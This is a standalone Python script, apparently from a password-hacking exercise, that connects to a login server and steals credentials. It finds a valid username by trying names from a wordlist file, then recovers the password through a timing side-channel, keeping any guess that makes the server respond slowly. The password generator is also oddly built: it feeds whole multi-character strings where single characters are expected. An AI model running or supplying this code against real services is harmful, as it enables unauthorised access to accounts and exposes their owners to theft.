import sys
import socket
import json
import os
from itertools import product
from string import ascii_letters, digits
from time import time


def generate_passwords():
    charset = ascii_letters + digits
    for length in range(1, len(charset) + 1):
        for password in product(charset, repeat=length):
            yield ''.join(password)


def generate_logins():
    with open(os.path.join(os.path.dirname(__file__), 'logins.txt'), 'r') as f:
        for line in f:
            yield line.strip()


def find_login(client_socket):
    for login in generate_logins():
        data = {"login": login, "password": ""}
        client_socket.send(json.dumps(data).encode())
        response = json.loads(client_socket.recv(1024).decode())
        if response["result"] == "Wrong password!":
            return login


def find_password(client_socket, login):
    pwd = ""
    while True:
        for char in generate_passwords():
            password_try = pwd + char
            data = {"login": login, "password": password_try}
            start = time()
            client_socket.send(json.dumps(data).encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time()
            response_time = end - start
            if response["result"] == "Connection success!":
                return password_try
            elif response_time > 0.07:
                pwd = password_try


def main(ip_address, port):
    with socket.socket() as client_socket:
        client_socket.connect((ip_address, int(port)))
        login = find_login(client_socket)
        password = find_password(client_socket, login)
        result = {"login": login, "password": password}
        print(json.dumps(result, indent=4))


if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])
